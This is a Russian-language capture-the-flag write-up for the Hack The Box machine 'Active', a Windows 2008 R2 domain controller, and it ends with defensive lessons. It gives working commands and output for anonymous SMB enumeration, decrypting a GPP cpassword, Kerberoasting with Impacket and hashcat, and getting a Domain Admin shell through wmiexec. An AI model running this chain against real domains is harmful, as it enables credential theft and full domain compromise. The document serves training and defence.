# Active (HTB)

> Платформа: Hack The Box  

> ОС: Windows  

> Сложность: Легко  

> Результат: root

---

## Цепочка Атаки

```text

Разведка

├── nmap -p- --min-rate=5000 -T4 -Pn -n active.htb → 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5722, 9389, 47001, +high RPC ports

├── nmap -sC -sV → Microsoft DNS 6.1.7601, Domain: active.htb, Host: DC, OS: Windows Server 2008 R2 SP1

└── /etc/hosts: 10.129.84.160 active.htb dc.active.htb

Первичный Доступ (Анонимный SMB -> GPP cpassword)

├── smbclient -L //10.129.84.160/ -N → anonymous login successful

├── Share Replication readable anonymously (SYSVOL replica)

├── smbclient //.../Replication -N -c 'recurse ON; mget \*' → Groups.xml

├── Groups.xml: cpassword="<GPP_CPASSWORD>"

└── gpp-decrypt → SVC\_TGS:<PASSWORD>

Аутентифицированное Перечисление

├── smbclient -L //10.129.84.160/ -U 'SVC\_TGS%<PASSWORD>' → Users, SYSVOL, Replication readable

├── smbclient //.../Users -c 'get user.txt' → <USER_FLAG>

└── GetUserSPNs.py -request → SPN active/CIFS:445 on Administrator → tgs.hash

Повышение Привилегий (Kerberoasting -> Domain Admin)

├── hashcat -m 13100 tgs.hash rockyou.txt → Administrator:<PASSWORD>

└── wmiexec.py active.htb/Administrator:<PASSWORD>@10.129.84.160 → shell

&#x20;   └── type C:\\Users\\Administrator\\Desktop\\root.txt → <ROOT_FLAG>

```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины

Windows Server 2008 R2 SP1 Domain Controller (`DC`) для домена `active.htb`. Профиль портов (53 DNS, 88 Kerberos, 389/3268 LDAP, 445 SMB, 464 kpasswd, 636 LDAPS, 3269 GC-LDAPS, 9389 AD Web Services) - это классическая подпись Active Directory. SMB signing включён и обязателен - SMB relay невозможен.

Две очень распространённые ошибки конфигурации AD делают эту машину уязвимой: анонимный SMB-доступ к реплике SYSVOL (шара `Replication`), которая содержит учётные данные Group Policy Preferences, и высокопривилегированная учётная запись (`Administrator`) с настроенным Service Principal Name, что делает возможным Kerberoasting.

---

## Разведка

### Port Scan

Полное сканирование TCP с `--min-rate=5000` для скорости, затем точечное сканирование сервисов по найденным портам:

```bash

mkdir -p \~/Desktop/active/scans; cd \~/Desktop/active/scans

nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n active.htb -oA scans/quick

nmap -sC -sV -Pn -n --open -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 active.htb -oA scans/detail

```

\*\*Результат (detail):\*\*

```

PORT      STATE SERVICE       VERSION

53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: ...)

135/tcp   open  msrpc         Microsoft Windows RPC

139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds?

464/tcp   open  kpasswd5?

593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0

636/tcp   open  tcpwrapped

3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)

3269/tcp  open  tcpwrapped

5722/tcp  open  msrpc         Microsoft Windows RPC

9389/tcp  open  mc-nmf        .NET Message Framing

47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

49152/tcp open  msrpc         Microsoft Windows RPC

...

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\_server\_2008:r2:sp1

Host script results:

| smb2-security-mode:

|   2.1:

|\_    Message signing enabled and required

```

Сводка по портам:

| Порт  | Сервис        | Заметки                                   |

|-------|---------------|-------------------------------------------|

| 53    | DNS           | Microsoft DNS 6.1.7601                    |

| 88    | Kerberos      | Windows Kerberos                          |

| 135   | MSRPC         | Windows RPC                               |

| 139   | NetBIOS-SSN   | Legacy SMB                                |

| 389   | LDAP          | Domain: active.htb                        |

| 445   | SMB           | Signing enabled and required              |

| 464   | kpasswd5      | Kerberos password change                  |

| 593   | RPC over HTTP | ncacn\_http                                |

| 636   | LDAPS         | tcpwrapped                                |

| 3268  | GC-LDAP       | Global Catalog LDAP                       |

| 3269  | GC-LDAPS      | tcpwrapped                                |

| 5722  | DFSR RPC      | Distributed File System Replication       |

| 9389  | AD Web Svcs   | .NET Message Framing                      |

| 47001 | HTTP          | Microsoft HTTPAPI                         |

Добавляем хост в `/etc/hosts`:

```bash

echo "10.129.84.160    active.htb dc.active.htb" | sudo tee -a /etc/hosts

```

\*\*Ключевое наблюдение:\*\* `dns-nsid` показывает `Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)`, LDAP сообщает домен `active.htb`. Это legacy DC (2008 R2) - ожидаем GPP-подобные ошибки конфигурации, Kerberos только с RC4, отсутствие современных митигаций.

---

## Первичный Доступ (Анонимный SMB -> GPP cpassword)

На DC разрешён анонимный SMB:

```bash

smbclient -L //10.129.84.160/ -N

```

\*\*Результат:\*\*

```

Anonymous login successful

&#x20;       Sharename       Type      Comment

&#x20;       ---------       ----      -------

&#x20;       ADMIN$          Disk      Remote Admin

&#x20;       C$              Disk      Default share

&#x20;       IPC$            IPC       Remote IPC

&#x20;       NETLOGON        Disk      Logon server share

&#x20;       Replication     Disk

&#x20;       SYSVOL          Disk      Logon server share

&#x20;       Users           Disk

```

Шара `Replication` выделяется. На Domain Controller `Replication` - это DFS-R реплика SYSVOL (содержит данные Group Policy). SYSVOL по дизайну доступен всем аутентифицированным пользователям - но анонимный доступ это ошибка конфигурации.

Скачиваем всю шару рекурсивно:

```bash

mkdir -p \~/Desktop/active/Replication; cd \~/Desktop/active/Replication

smbclient //10.129.84.160/Replication -N -c 'recurse ON; prompt OFF; mget \*'

```

\*\*Результат:\*\*

```

getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI ...

getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\GPE.INI ...

getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol ...

getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml ...

...

```

Ищем файл Group Policy Preferences:

```bash

find \~/Desktop/active/Replication -iname 'Groups.xml'

```

\*\*Результат:\*\*

```

/home/kali/Desktop/active/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

```

Читаем файл:

```bash

cat "$(find \~/Desktop/active/Replication -iname 'Groups.xml' | head -1)"

```

\*\*Результат:\*\*

```xml

<?xml version="1.0" encoding="utf-8"?>

<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">

&#x20; <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\\SVC\_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">

&#x20;   <Properties action="U" newName="" fullName="" description="" cpassword="<GPP_CPASSWORD>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\\SVC\_TGS"/>

&#x20; </User>

</Groups>

```

Атрибут `cpassword` - это зашифрованный пароль. Microsoft опубликовала AES-256 ключ, используемый GPP, в 2012 году (MSDN \[MS-GPPREF] 2.2.1.1.4), поэтому расшифровка тривиальна:

```bash

gpp-decrypt '<GPP_CPASSWORD>'

```

\*\*Результат:\*\*

```

<PASSWORD>

```

Получены учётные данные: `active.htb\\SVC\_TGS : <PASSWORD>`.

---

## Аутентифицированное Перечисление

Проверяем доступ с полученными учётными данными:

```bash

smbclient -L //10.129.84.160/ -U 'active.htb\\SVC\_TGS%<PASSWORD>'

```

\*\*Результат:\*\* `Users`, `SYSVOL`, и `Replication` доступны. `ADMIN$`, `C$`, `IPC$` недоступны для non-admin аккаунта.

Флаг пользователя лежит в шаре `Users`:

```bash

smbclient //10.129.84.160/Users -U 'active.htb\\SVC\_TGS%<PASSWORD>' -c 'cd "SVC\_TGS\\Desktop"; ls; get user.txt'

cat user.txt

```

\*\*Результат:\*\*

```

<USER_FLAG>

```

Далее перечисляем аккаунты с Service Principal Name - они Kerberoastable. Impacket `GetUserSPNs.py` аутентифицируется как `SVC\_TGS` и запрашивает TGS-REP тикет для каждого SPN, который видит:

```bash

GetUserSPNs.py active.htb/SVC\_TGS:<PASSWORD> -dc-ip 10.129.84.160 -request -outputfile \~/Desktop/active/tgs.hash

```

\*\*Результат:\*\*

```

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation

--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------

active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 23:06:40.351723  ...

```

\*\*Ключевое наблюдение:\*\* аккаунт `Administrator` сам имеет SPN (`active/CIFS:445`). Поскольку `Administrator` - Domain Admin, TGS-REP тикет зашифрован NTLM хэшем Domain Admin аккаунта - его взлом даёт полный контроль над доменом.

Хэш записан в `\~/Desktop/active/tgs.hash`:

```bash

ls -l \~/Desktop/active/tgs.hash

wc -c \~/Desktop/active/tgs.hash

```

---

## Эксплуатация

No CVE (custom vulnerability) - Group Policy Preferences хранят значение `cpassword` зашифрованным статическим AES-256 ключом, опубликованным Microsoft (MSDN \[MS-GPPREF] 2.2.1.1.4, 2012); SYSVOL доступен всем аутентифицированным пользователям по дизайну. Анонимный доступ на чтение к реплике SYSVOL раскрыл зашифрованный пароль неаутентифицированному атакующему.

No CVE (design weakness) - Kerberoasting злоупотребляет легитимным Kerberos TGS-REQ / TGS-REP потоком; любой аутентифицированный пользователь может запросить service ticket для любого SPN и взломать его офлайн, потому что тикет зашифрован NTLM хэшем сервисного аккаунта. Уязвимости в протоколе нет - только слабый, словарный пароль сервисного аккаунта.

---

## Повышение Привилегий (Kerberoasting -> Domain Admin)

Взламываем TGS-REP хэш. Формат `$krb5tgs$23$...` (etype 23, RC4-HMAC), что соответствует режиму hashcat `13100`:

```bash

hashcat -m 13100 \~/Desktop/active/tgs.hash /usr/share/wordlists/rockyou.txt --force --potfile-disable

```

\*\*Результат:\*\*

```

hashcat (v7.1.2) starting

...

$krb5tgs$23$\*Administrator$ACTIVE.HTB$...:<PASSWORD>

...

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)

Hash.Target......: $krb5tgs$23$\*Administrator$ACTIVE.HTB$active.htb/Ad...651dcc

Time.Started.....: ... (5 secs)

Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 10543104/14344385 (73.50%)

```

Получены учётные данные: `active.htb\\Administrator : <PASSWORD>`.

Аккаунт - Domain Admin. Impacket `wmiexec.py` даёт полуинтерактивный shell через WMI/SMB:

```bash

wmiexec.py active.htb/Administrator:<PASSWORD>@10.129.84.160

```

\*\*Результат:\*\*

```

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

\[\*] SMBv2.1 dialect used

\[!] Launching semi-interactive shell - Careful what you execute

\[!] Press help for extra shell commands

C:\\>whoami

active\\administrator

C:\\>type C:\\Users\\Administrator\\Desktop\\root.txt

<ROOT_FLAG>

```

---

## Флаги

| Флаг | Значение                         |

|------|----------------------------------|

| User | <USER_FLAG> |

| Root | <ROOT_FLAG> |

---

## Ключевые Выводы

\- \*\*Анонимный SMB на Domain Controller - критическая ошибка конфигурации.\*\* Шара `Replication` раскрыла полную реплику SYSVOL неаутентифицированным пользователям. SYSVOL по дизайну доступен аутентифицированным пользователям, но не анонимно.

\- \*\*Group Policy Preferences (GPP) `cpassword` фактически является открытым текстом.\*\* Microsoft опубликовала AES-256 ключ в 2012 (MSDN \[MS-GPPREF] 2.2.1.1.4) и закрыла новые GPP-развёртывания в MS14-025, но патч не удаляет существующие значения `cpassword` из SYSVOL. Никогда не храните учётные данные в GPP.

\- \*\*Не привязывайте SPN к высокопривилегированным аккаунтам.\*\* Здесь `Administrator` сам имел SPN (`active/CIFS:445`). Любой аутентифицированный пользователь (включая низкопривилегированного `SVC\_TGS`) мог запросить его TGS-REP и взломать офлайн, получив мгновенный доступ Domain Admin.

\- \*\*Kerberoasting - это слабость дизайна, а не уязвимость.\*\* Защита - длинные, случайно сгенерированные пароли сервисных аккаунтов (или gMSA с автоматической ротацией), а не патчинг протокола. Мониторьте необычный объём TGS-REQ (Event ID 4769 с RC4 шифрованием).

\- \*\*RC4 (etype 23) делает Kerberoasting быстрым.\*\* В 2026 Microsoft формально связала RC4-based Kerberoasting с CVE-2026-20833 (Kerberos information disclosure, CVSS 5.5) и начала отключать RC4 по умолчанию на Domain Controllers (enforcement с июля 2026). Домен `active.htb` в этом walkthrough всё ещё использовал RC4 на момент атаки.

\- \*\*SMB signing включён и обязателен\*\* предотвратил SMB relay - машина была защищена от одного класса атак, оставаясь уязвимой к другим.

\- \*\*Многослойная ошибка:\*\* одного утекшего пароля низкопривилегированного сервисного аккаунта (`SVC\_TGS`) было достаточно, потому что модель прав AD по умолчанию позволяет любому аутентифицированному пользователю запрашивать service tickets для любого SPN, а самый привилегированный аккаунт в домене был Kerberoastable.

